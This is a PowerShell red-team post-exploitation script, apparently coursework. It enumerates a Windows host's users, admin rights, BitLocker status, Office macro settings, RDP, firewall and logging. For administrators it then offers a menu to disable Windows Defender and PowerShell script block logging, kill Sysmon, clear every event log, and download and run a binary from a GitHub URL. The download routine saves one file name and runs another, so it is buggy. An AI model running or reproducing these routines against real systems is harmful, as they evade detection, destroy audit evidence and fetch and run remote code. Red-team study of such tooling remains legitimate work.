<#
Script Name: redteam-sysinfo-v2.ps1
Author: Robert Riskin
Date: 2020/06/06
Tested On: Windows 10 1809, 1903, domain joined and non-domain joined

Notes: This script is a first run at a redteam script to scrape information for potential post-exploitation purposes. It is designed to be run under any user context as it will only run elevated commands if the current user is an administrator.
This script will pull basic information such as current logged-in user, computer name, IP address and MAC Address.
This script will determine if the computer is joined to a domain.
This script will verify if the current user is a member of the local administrators group or any domain joined groups that are placed in the local Windows Administrators Group.
This script will check to see if there are any Bitlocker drives mounted and display their status and encryption schema.
This script will check to see if any version of Office 2010-365 is installed and if macros are enabled.
This script will check to see if the Internet is working by testing an TLS connection to the Microsoft Updates Catalog.
This script will check to see if RDP is enabled on the local computer.
This script will check to see if any of the Windows Firewall Profiles are disabled.

Version 2 Update Notes
* FIXES - fixed bitlocker check when running against a machine that does not have bitlocker
* FIXES - fixed the invoke-webrequest issue where if IE had not been run before, this function fails
* NEW FEATURES  *
*Implented Verb-Noun Grammar in functions
*Implemented menu for active/passive functions to limit artifacts left behind
*Implemented Powershell Logging/ScriptBlock Checking
*Implemented Sysmon Checking
*Implemented Post Exploitation Module including disabling Windows Defender, disabling sysmon, clearing eventlog, disabling powershell Logging/ScriptBlock Checking, downloading and executing secondary binary

#>

#Funcion that gets current username, computername, ip address, & mac address
Function Get-BasicSystemInfo
{
	#gets logged-in user's username, computer, ip and MAC address
	$currentuser = $env:username
	$currentcomputer = $env:computername
	$ipaddress = get-netipaddress -addressfamily ipv4 | where {$_.IPAddress -ne "127.0.0.1"} | select IPaddress -expandproperty IPAddress
	$macaddress = (gwmi win32_networkadapterconfiguration).macaddress

	#Outputs info to commandline
	echo "*************************************************************"
	echo "**********RedTeam-SysInfo-Version-2**************************"
	echo "*************************************************************"
	echo "*************************************************************"
	echo "**********Basic System Information***************************"
	echo "*************************************************************"
	echo("* Current User: "+$currentuser)
	echo("* Current Computer Name: "+$currentcomputer)
	echo("* IP Address: "+$ipaddress)
	echo("* MAC Address: "+$macaddress)
	echo "*************************************************************"
}

#Function that verifies if computer is part of a domain, global because it is called from other functions
Function global:Verify-Domain
{
	
	$domainjoined = (gwmi win32_computersystem).partofdomain
	return $domainjoined
}

#Function that verifies if the current logged in user is a local admin, depending if computer is domain joined
Function Verify-Admin
{
	#sets array variable to track if local admin or a domain group that is a member of local admin group
	$adminArray= @()

	#checks to see if the computer is on domain, as the user/admin checks are slightly different
	if (Verify-Domain)
	{
	$loggedindomainuser = $env:username
	$localadminusers = get-localgroupmember -group administrators | where {$_.objectclass -eq "user"} | select Name -expandproperty name
	
	#checks to see if current user is a domain user listed in local admin group
	foreach ($localadminuser in $localadminusers)
		{
			if ($localadminuser -like $loggedindomainuser)
				{
					echo "Logged in user is a member of the local administrators group."
					$adminArray += "isAdmin"
				}
		}
	
	$localadmingroups = get-localgroupmember -group administrators | where {$_.objectclass -eq "group"} | select Name -expandproperty name
	
	#loops through any domain groups that are part of the local admin group and checks to see if current user is a member of any
	foreach ($localadmingroup in $localadmingroups)
		{
			$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
			$principal = New-Object System.Security.Principal.WindowsPrincipal($User)
			if ($principal.IsInRole($localadmingroup))
				{
					echo "Logged in user is a member of a group that is a member of the local administrators group."
					$adminArray += "isAdmin"
				}
		}


	}

	#fails domain check and checks current user against local admin group
	else
		{
	
			$loggedinuser = $env:computername+"\"+$env:username	
			$localadminusers = get-localgroupmember -group administrators | where {$_.objectclass -eq "user"} | select Name -expandproperty name
			foreach ($localadminuser in $localadminusers)
				{
					if ($localadminuser -eq $loggedinuser)
						{
							echo "Logged in user is a member of the local administrators group."
							$adminArray += "isAdmin"
						}
		}
	}
	#returns the array of admins
	return $adminArray
		

}

#Function that determines if the OS Volume is bitlocker encrypted and other details
Function global:Get-Bitlocker
{
	#retrieves bitlocker status via manage-bde command
	$bitlockerstatus = manage-bde -status
	
	$bitlockerprotectionstatus = $bitlockerstatus | select -Index 13
	$bitlockerconversion = $bitlockerstatus | select -Index 10
	#if bitlocker protection is on, proceed to display information
	if($bitlockerconversion.Substring(26,15) -eq "Fully Encrypted")
		{
			#Bitlocker Volume
			$bitlockervolume = $bitlockerstatus | select -Index 5
			echo ("* Bitlocked Volume: "+$bitlockervolume.Substring(7,2))

			$bitlockerconversion = $bitlockerstatus | select -Index 10
			echo ("* Bitlocked Volume Encryption Status: "+$bitlockerconversion.Substring(26,15))

			$bitlockermethod = $bitlockerstatus | select -Index 12
			echo ("* Bitlocked Volume Encryption Schema: "+$bitlockermethod.Substring(26,11))

		}	
	 
	 if($bitlockerconversion.Substring(26,15) -eq "Fully Decrypted")
		{
			echo ("* No disks encrypted with Bitlocker.")
		}
	 
	 else 
		{
		 if($bitlockerconversion.Substring(26, 25) -eq "Used Space Only Encrypted")
			{
				#Bitlocker Volume
				$bitlockervolume = $bitlockerstatus | select -Index 5
				echo ("* Bitlocked Volume: "+$bitlockervolume.Substring(7,2))

				$bitlockerconversion = $bitlockerstatus | select -Index 10
				echo ("* Bitlocked Volume Encryption Status: "+$bitlockerconversion.Substring(26,25))

				$bitlockermethod = $bitlockerstatus | select -Index 12
				echo ("* Bitlocked Volume Encryption Schema: "+$bitlockermethod.Substring(26))

			}
		}
}

#Function that determines the version(s) of Microsoft Office installed, uses registry settings
Function Get-OfficeVersion 
{
	#sets an array to keep track of office versions in case there are multiple installations
	$officeVersion= @()
	
	#sets variables for paths to registry locations of Office install locations
	
	if(test-path "hklm:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration")
		{
			$officeversion1 = "hklm:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration"
			$version1 = get-itemproperty -path $officeversion1 -name VersionToReport
			if([bool](get-itemproperty -path $officeversion1 -name VersionToReport))
				{
					if($version1.VersionToReport -ge "16")
						{
							echo "* Office 2016+ is installed."
							$officeVersion += "2016"
						}
					if($version1.VersionToReport -lt "16")
						{
							echo "* Office 2013 is installed"
							$officeVersion += "2013"
						}
			
				}
		}
	
	if(test-path "hklm:\SOFTWARE\Microsoft\Office\14.0\Common\FilesPaths")
		{
			$officeversion2 = "hklm:\SOFTWARE\Microsoft\Office\14.0\Common\FilesPaths"
			if([bool](get-itemproperty -path $officeversion2))
				{
					echo "* Office 2010 is installed."
					$officeVersion += "2010"
				}	
		}
#Returns the office array of versions
return $officeVersion
}

#Function that checks for internet connectivity via TLS to the Microsoft Update Catalog to avoid suspicioun in network logs
Function Check-Internet
{
	$webrequest = invoke-webrequest "https://catalog.update.microsoft.com" -usebasicparsing
	if($webrequest.statuscode -eq "200")
		{
			echo "* Computer can reach the internet."
		}
	else
		{
			echo "* Computer cannot reach the internet."
		}
}

#Function that checks if RDP is enabled via a registry setting
Function Check-RDPAccess
{
	$rdppath = "hklm:\system\currentcontrolset\control\terminal server"
	$rdpenabled = get-itemproperty -path $rdppath -name fDenyTSConnections
	if($rdpenabled.fDenyTSConnections -eq "0")
		{
			echo "* RDP is enabled!"
		}
	else
		{
			echo "* RDP is disabled."
		}
}

#Function that checks to see if the three different Windows Firewall Profiles are enabled
Function Check-WindowsFirewall
{
	#retrieves firewall status via get-netfirewallprofile commandlet
	$firewallprofiles = get-netfirewallprofile

	#sets variables for the three firewall settings
	$domainprofile = $firewallprofiles | where-object {$_.Name -eq "Domain"}
	$privateprofile = $firewallprofiles | where-object {$_.Name -eq "Private"}
	$publicprofile = $firewallprofiles | where-object {$_.Name -eq "Public"}
	
	#checks to see if each of the three firewall profiles is disabled
	if(($domainprofile.enabled -eq "True") -and ($privateprofile.enabled -eq "True") -and ($publicprofile.enabled -eq "True"))
		{
			echo "* Windows Firewall is enabled on all profiles."
		}
	else
		{
			echo "* At least one of the Windows Firewall profiles is disabled."
		}
	
}

#Function that checks to see if Sysmon is running on the system.
Function Check-Sysmon
{
	#gets process list and looks for the sysmon name - note if sysmon was renamed this will not work
	if (get-process | where-object { $_.name -eq 'sysmon' })
		{
			echo "* Sysmon is running on the system."
		}
	else
		{
			echo "* Sysmon is not running on the system."
		}
}

#Function that checks to see if powershell logging is enabled
Function Check-PowershellLogging
{
	if(test-path "hklm:\software\policies\microsoft\windows\powershell\scriptblocklogging")
		{
			#sets variables for registry locations of powershell logging
			$powershellloggingpath = "hklm:\software\policies\microsoft\windows\powershell\scriptblocklogging"
			$powershellloggingenabled = get-itemproperty -path $powershellloggingpath -name EnableScriptBlockLogging
			if([bool](get-itemproperty -path $powershellloggingpath -name EnableScriptBlockLogging))
				{
					if($powershellloggingenabled.EnableScriptBlockLogging -eq "1")
						{
							echo "* Powershell Script Block Logging is enabled."
						}
				}
		}
		
	if(test-path "hklm:\software\policies\microsoft\windows\powershell\modulelogging")
		{
			#sets variables for registry locations of powershell logging
			$powershellmoduleloggingpath = "hklm:\software\policies\microsoft\windows\powershell\modulelogging"
			$powershellmoduleloggingenabled = get-itemproperty -path $powershellmoduleloggingpath -name EnableModuleLogging
			if([bool](get-itemproperty -path $powershellmoduleloggingpath -name EnableModuleLogging))
				{
					if($powershellloggingenabled.EnableModuleLogging -eq "1")
						{
							echo "* Powershell Module Logging is enabled."
						}
				}
		}
	
	if(test-path "hklm:\software\policies\microsoft\windows\powershell\transcription")
		{
			#sets variables for registry locations of powershell logging
			$powershelltranscriptionloggingpath = "hklm:\software\policies\microsoft\windows\powershell\transcription"
			$powershelltranscriptionloggingenabled = get-itemproperty -path $powershelltranscriptionloggingpath -name EnableTranscripting
			if([bool](get-itemproperty -path $powershelltranscriptionloggingpath -name EnableTranscripting))
				{
					if($powershellloggingenabled.EnableTranscripting -eq "1")
						{
							echo "* Powershell Transcription Logging is enabled."
						}
				}
		}
}

#Function that disables Powershell ScriptBlock Logging
Function Disable-PowershellScriptBlockLogging
{
	#checks to see if ps script block reg key exists
	if(test-path "hklm:\software\policies\microsoft\windows\powershell\scriptblocklogging")
		{
			#sets registry key to disable script block logging
			set-itemproperty -path "hklm:\software\policies\microsoft\windows\powershell\scriptblocklogging" -name EnableScriptBlockLogging -value 0
			echo "* Powershell Script Block Logging has been disabled."
		}
	else	
		{
			echo " ! Powershell Script Block Logging registry key does not exist !"
		}
}

#Function that disables Sysmon
Function Disable-Sysmon
{
	#gets process list that filters based on sysmon executable and force kills the process - if sysmon is renamed to another filename this will not disable sysmon
	get-process | where-object { $_.name -eq 'sysmon' } | stop-process -force
	echo "* Sysmon process has been killed."
}

#Function that downloads and executes a binary application - currently downloads calc.exe from my github
Function Download-ExecuteBinary
{
	#downloads calc.exe from my github account
	invoke-webrequest -uri "https://github.com/robertriskin/csc842/blob/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/cmd.exe?raw=true" -outfile "c:\windows\temp\evilcmd.exe"
	
	#executes the downloaded calc.exe
	& "c:\windows\temp\evilcalc.exe"
}

#Function that clears all event logs
Function Clear-Eventlogs
{
	#Note this will leave an eventlog clear event 1102 in the security and system event log.
	#retrieve this command from https://www.tenforums.com/tutorials/16588-clear-all-event-logs-event-viewer-windows.html referenced this code
	Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log } 
	echo "* All Windows eventlogs have been cleared!"
}

#Function that disables Windows Defender via registry key settings
Function Disable-WindowsDefender
{
	#does initial check to validate that the windows defender key exists
	if(test-path "hklm:\software\policies\microsoft\windows defender\real-time protection")
		{
			#set options that will disable windows defender scanning and protection
			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableBehaviorMonitoring -value 1
			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableOnAccessProtection -value 1
			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIOAVProtection -value 1
			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIntrusionPreventionSystem -value 1
			echo "* Windows Defender has been disabled."
		}
	else	
		{
			echo " ! Windows Defender registry key does not exist !"
		}
}

#Function that displays the post-exploitation module options (only executes if local user is an administrator
function Display-PostExploitationMenu
{
	Write-Host "***************Post-Exploitation-Menu********************"
	Write-Host " 1: Press '1' Check for Internet Access - warning leaves network logs."
	Write-Host " 2: Press '2' Disable Powershell Script Block Logging."
	Write-Host " 3: Press '3' Disable Sysmon."
	Write-Host " 4: Press '4' Disable Windows Defender."
	Write-Host " 5: Press '5' Download and execute a binary (calc.exe)."
	Write-Host " 6: Press '6' Clear all Windows eventlogs."
	Write-Host " 7: Press '7' Execution all post exploitation actions."
	Write-Host " q: Press 'q' to quit the application."
}

#executes the getbasicsysteminfo function
Get-BasicSystemInfo

#executes the Verify-Admin function
if((Verify-Admin) -contains "isAdmin")
	{
		echo "*************************************************************"
		echo "**********Advanced System Information************************"
		echo "*************************************************************"
		echo "* Current user is a member of the local administrator group."

		#executes functions that require admin access
		#executes bitlocker discovery function
		Get-Bitlocker

		#executes office version discovery and macro check, macro checks are based off Office version from previous function and other hardcoded registry settings
		if((Get-OfficeVersion) -contains "2010")
			{
				if(test-path "hkcu:\software\policies\microsoft\office\14.0\msproject\security")
					{
						$macropath = "hkcu:\software\policies\microsoft\office\14.0\msproject\security"
						$macroenabled = get-itemproperty -path $macropath -name VBAWarnings
						if([bool](get-itemproperty -path $macropath -name VBAWarnings))
							{
								if($macroenabled.VBAWarnings -eq "1")
									{
										echo "* Macros are enabled!"
									}

							}
						echo "* Microsoft Office 2010 is installed."
					}
				
			}	
		if((Get-OfficeVersion) -contains "2013")
			{
				if(test-path "hkcu:\software\policies\microsoft\office\15.0\excel\security")
					{
						$macropath = "hkcu:\software\policies\microsoft\office\15.0\excel\security"
						$macroenabled = get-itemproperty -path $macropath -name blockcontentexecutionfrominternet
						if([bool](get-itemproperty -path $macropath -name blockcontentexecutionfrominternet))
							{
								if($macroenabled.blockcontentexecutionfrominternet -ne "1")
									{
										echo "* Macros are enabled!"
									}

							}

						echo "* Microsoft Office 2013 is installed."
					}
				
			}
		if((Get-OfficeVersion) -contains "2016")
			{
				if(test-path "hkcu:\software\policies\microsoft\office\16.0\excel\security")
					{
						$macropath = "hkcu:\software\policies\microsoft\office\16.0\excel\security"
						$macroenabled = get-itemproperty -path $macropath -name blockcontentexecutionfrominternet
						if([bool](get-itemproperty -path $macropath -name blockcontentexecutionfrominternet))
							{
								if($macroenabled.blockcontentexecutionfrominternet -ne "1")
									{
										echo "* Macros are enabled!"
									}

							}


						echo "* Microsoft Office 2016+ is installed, this can include Office 2016, 2019, 365."
					}
				
			}

		#executes RDP check function
		Check-RDPAccess

		#executes Windows Firewall check function
		Check-WindowsFirewall
		
		#executes Check-Sysmon function	
		Check-Sysmon
		
		#executes the Check-PowershellLogging check function	
		Check-PowershellLogging
		
	}
	
#assumes user is NOT an admin and runs non-admin functions
else
	{
		echo "* Current user is not a local administrator."

		#executes functions that do not require admin access

		#executes office version discovery and macro check, macro checks are based off Office version from previous function and other hardcoded registry settings
		if((Get-OfficeVersion) -contains "2010")
			{
				$macropath = "hkcu:\software\policies\microsoft\office\14.0\msproject\security"
				$macroenabled = get-itemproperty -path $macropath -name VBAWarnings
				if([bool](get-itemproperty -path $macropath -name VBAWarnings))
					{
						if($macroenabled.VBAWarnings -eq "1")
							{
								echo "* Macros are enabled!"
							}

					}
				echo "* Microsoft Office 2010 is installed."
			}	
		if((Get-OfficeVersion) -contains "2013")
			{
				$macropath = "hkcu:\software\policies\microsoft\office\15.0\excel\security"
				$macroenabled = get-itemproperty -path $macropath -name blockcontentexecutionfrominternet
				if([bool](get-itemproperty -path $macropath -name blockcontentexecutionfrominternet))
					{
						if($macroenabled.blockcontentexecutionfrominternet -ne "1")
							{
								echo "* Macros are enabled!"
							}

					}

				echo "* Microsoft Office 2013 is installed."
			}
		if((Get-OfficeVersion) -contains "2016")
			{
				$macropath = "hkcu:\software\policies\microsoft\office\16.0\excel\security"
				$macroenabled = get-itemproperty -path $macropath -name blockcontentexecutionfrominternet
				if([bool](get-itemproperty -path $macropath -name blockcontentexecutionfrominternet))
					{
						if($macroenabled.blockcontentexecutionfrominternet -ne "1")
							{
								echo "* Macros are enabled!"
							}

					}


				echo "* Microsoft Office 2016+ is installed, this can include Office 2016, 2019, 365."
			}

		#executes RDP check function
		Check-RDPAccess

		#executes Windows Firewall check function
		Check-WindowsFirewall
		
		#executes the Check-PowershellLogging check function	
		Check-PowershellLogging
		
	}

#checks for admin access before offering the post-exploitation menu - actions will only work if user is administrator
if((Verify-Admin) -contains "isAdmin")
{
	#loop thru post exploitation menu until q is entered to quit
	do
		{
			#calls the display post exploitation menu function
			Display-PostExploitationMenu
			#variable to take in user input from commandline
			$selection = Read-Host "Enter command:"
			#switch case that executes user inputted action - functions are self-explanatory
			switch ($selection)
				{
					'1'
						{
							Check-Internet
						}
					
					'2'
						{
							Disable-PowershellScriptBlockLogging
						}
					'3'
						{
							Disable-Sysmon
						}
					'4'
						{
							Disable-WindowsDefender
						}	
					'5'
						{
							Download-ExecuteBinary
						}
					'6'
						{
							Clear-Eventlogs
						}
					'7'
						{
							Check-Internet
							Disable-PowershellScriptBlockLogging
							Disable-Sysmon
							Disable-WindowsDefender
							Download-ExecuteBinary
							Clear-Eventlogs
						}
				}
			pause
		}
	#loops until 'q' is entered in post exploitation menu
	until ($selection -eq 'q')
}
#end of script
